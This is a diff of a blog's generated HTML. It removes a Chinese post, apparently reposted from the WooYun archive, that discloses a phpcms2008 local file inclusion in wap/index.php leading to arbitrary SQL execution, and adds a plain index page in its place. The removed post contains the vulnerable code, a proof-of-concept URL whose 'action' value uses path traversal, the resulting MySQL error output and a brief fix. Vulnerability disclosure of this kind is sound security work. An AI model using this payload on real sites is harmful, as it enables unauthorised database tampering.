@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
     <title>
         
-        phpcms2008本地文件包括及利用（执行任意SQL脚本） · \xeb\xfe&#39;s Blog
+        \xeb\xfe&#39;s Blog
         
     </title>
     <link rel="icon" href= /assests/favicon.ico>
@@ -105,22 +105,11 @@ white-space: pre;
     
 </head>
     
-        <body class="post-body">
-    
     
 <header class="header">
 
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/" >\xeb\xfe&#39;s Blog.</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">phpcms2008本地文件包括及利用（执行任意SQL脚本）</a>
-            </div>
-    </div>
     
     <a class="home-link" href=/>\xeb\xfe's Blog.</a>
 </header>
@@ -128,43 +117,21 @@ white-space: pre;
         <div class="site-intro">
     
     <!-- 主页  -->
-    
-    
-    <!-- 404页  -->
             
-    <div class="site-intro-img" style="background-image: url(http://oumn0o088.bkt.clouddn.com/post-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-placeholder"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            phpcms2008本地文件包括及利用（执行任意SQL脚本）
-            <!-- 404 -->
-            
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-            
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页meta -->
-        
-            <!-- 文章页标签  -->
-            
-                <div class= post-intro-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-href = wooyun-1000php>wooyun-1000php</a>
-    
-</div>
-            
-            <div class="post-intro-meta">
-                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                <span class="post-intro-time">2017/12/08</span>
-            </div>
         
     </div>
 </div>
@@ -232,64 +199,42 @@ white-space: pre;
             }
         </script>
         <div class="container container-unloaded">
-            <main class="main post-page">
-    <article class="article-entry">
-        <h3 id="简要描述"><a href="#简要描述" class="headerlink" title="简要描述"></a>简要描述</h3><p>phpcms2008本地文件包括及利用（执行任意SQL脚本）</p>
-<h3 id="漏洞文件-wap-index-php"><a href="#漏洞文件-wap-index-php" class="headerlink" title="漏洞文件(wap/index.php)"></a>漏洞文件(wap/index.php)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../include/common.inc.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'./include/global.func.php'</span>;</span><br><span class="line">$lang = <span class="keyword">include</span> <span class="string">'./include/lang.inc.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/(mozilla|m3gate|winwap|openwave)/i'</span>, $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>])) </span><br><span class="line">&#123;</span><br><span class="line">header(<span class="string">'location:../'</span>);</span><br><span class="line">&#125;</span><br><span class="line">wmlHeader($PHPCMS[<span class="string">'sitename'</span>]);</span><br><span class="line">$action = <span class="keyword">isset</span>($action) &amp;&amp; !<span class="keyword">empty</span>($action) ? $action : <span class="string">'index'</span>;</span><br><span class="line"><span class="keyword">if</span>($action) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'./include/'</span>.$action.<span class="string">'.inc.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$html = CHARSET != <span class="string">'utf-8'</span> ? iconv(CHARSET, <span class="string">'utf-8'</span>, $html) : $html;</span><br><span class="line"><span class="keyword">echo</span> str_replace(<span class="string">'&lt;br/&gt;'</span>, <span class="string">"&lt;br/&gt;\n"</span>, $html);</span><br><span class="line">wmlFooter();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>第10行代码处，action 变量没有判断及过滤，造成本地文件包含漏洞。</p>
-<h3 id="漏洞利用之一-include-fields-areaid下任意文件"><a href="#漏洞利用之一-include-fields-areaid下任意文件" class="headerlink" title="漏洞利用之一(include\fields\areaid下任意文件)"></a>漏洞利用之一(include\fields\areaid下任意文件)</h3><p>如：field_add.inc.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!$maxlength) $maxlength = <span class="number">255</span>;</span><br><span class="line">$maxlength = min($maxlength, <span class="number">255</span>);</span><br><span class="line">$sql = <span class="string">"ALTER TABLE `$tablename` ADD `$field` VARCHAR( $maxlength ) NOT NULL DEFAULT '$defaultvalue'"</span>;</span><br><span class="line">$db-&gt;query($sql);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>这里的$tablename,$field等变量可以直接传入并且没有任何的过滤，可以通过构造SQL语句执行任意SQL脚本，需要用Opera等浏览器访问。</p>
-<h3 id="漏洞证明"><a href="#漏洞证明" class="headerlink" title="漏洞证明"></a>漏洞证明</h3><p>用Opera浏览器访问,客户端弹出报错信息<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.phpcms.cn/wap/index.php?action=../../include/fields/areaid/field_add&amp;tablename=xx</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"font-size:12px;text-align:left; border:1px solid #9cc9e0; padding:1px 4px;color:#000000;font-family:Arial, Helvetica,sans-serif;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>MySQL Query : <span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">ALTER TABLE `xx` ADD `` VARCHAR( 255 ) NOT NULL DEFAULT '' <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span> MySQL Error : <span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">Table 'phpcms.xx' doesn't exist <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>MySQL Errno : <span class="tag">&lt;/<span class="name">b</span>&gt;</span>1146 <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span> Message : <span class="tag">&lt;/<span class="name">b</span>&gt;</span> MySQL Query Error</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h3><p>对用户传入的action值进行判断以及过滤</p>
-<p>原文链接：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2010-0497.html" target="_blank" rel="noopener">phpcms2008本地文件包括及利用（执行任意SQL脚本）</a></p>
-
-    </article>
-    <!-- 前后页  -->
-    <ul class="post-pager">
-        
-            <li class="next">
-                <a href= "/2017/12/08/wooyun-1000php-9/" title= PHP168 V6.02整站系统远程执行任意代码漏洞 >
-                    <span>往前一页</span>
-                    <span>PHP168 V6.02整站系统远程执行任意代码漏洞</span>
-                </a>
-            </li>
-        
-        
-            <li class="previous">
-                <a href= "/2017/12/08/wooyun-1000php-7/" title= phpwind远程代码执行漏洞-2010.09 >
-                    <span>往后一页</span>
-                    <span>phpwind远程代码执行漏洞-2010.09</span>
-                </a>
-            </li>
-        
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-    <div id="lv-container" data-id="city" data-uid= MTAyMC8zMjI3OC84ODQy>
-        <script type="text/javascript">
-            (function (d, s) {
-                var j, e = d.getElementsByTagName(s)[0];
-                if (typeof LivereTower === 'function') { return; }
-                j = d.createElement(s);
-                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-                j.async = true;
-
-                e.parentNode.insertBefore(j, e);
-            })(document, 'script');
-        </script>
-        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
-    </div>
-
-<!-- City版安装代码已完成 -->
+            <main class="main index-page">
     
     
-    <!--PC版-->
+    
+        <article class="index-post">
+            <a class="content-show-full" href = "/2017/11/24/blog/" >
+                    <h2 class="abstract-title">
+                        
+                        <span>My blog</span>
+                    </h2>
+                <div class="abstract-content">
+                    什么都不会的辣鸡终于把博客搭建好了！
 
-    <!--PC版-->
-
-
+                </div>
+            </a>
+            <div class="abstract-post-meta">
+                <!-- tags  -->
+                
+                <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = 小试牛刀>小试牛刀</a>
+    
+</div>
+                
+                <!-- date  -->
+                <div class="abstract-date">
+                    <span class="abstract-calander iconfont-archer"></span><span class="abstract-time">2017/11/24</span>
+                </div>
+            </div>
+        </article>
+    
+    <!-- paginator  -->
+    
+    <nav class="page-nav">
+        <a class="extend prev" rel="prev" href="/archives/2017/page/2/">#PREV</a><a class="page-number" href="/archives/2017/">1</a><a class="page-number" href="/archives/2017/page/2/">2</a><span class="page-number current">3</span>
+    </nav>
     
 </main>
             <!-- profile -->
@@ -332,13 +277,6 @@ white-space: pre;
 </footer>
     </div>
     <!-- toc -->
-    
-    <div class="toc-wrapper">
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简要描述"><span class="toc-number">1.</span> <span class="toc-text">简要描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞文件-wap-index-php"><span class="toc-number">2.</span> <span class="toc-text">漏洞文件(wap/index.php)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用之一-include-fields-areaid下任意文件"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用之一(include\fields\areaid下任意文件)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞证明"><span class="toc-number">4.</span> <span class="toc-text">漏洞证明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复方案："><span class="toc-number">5.</span> <span class="toc-text">修复方案：</span></a></li></ol>
-    </div>
     
     <div class="back-top">&#xe639;</div>
     <div class="sidebar">
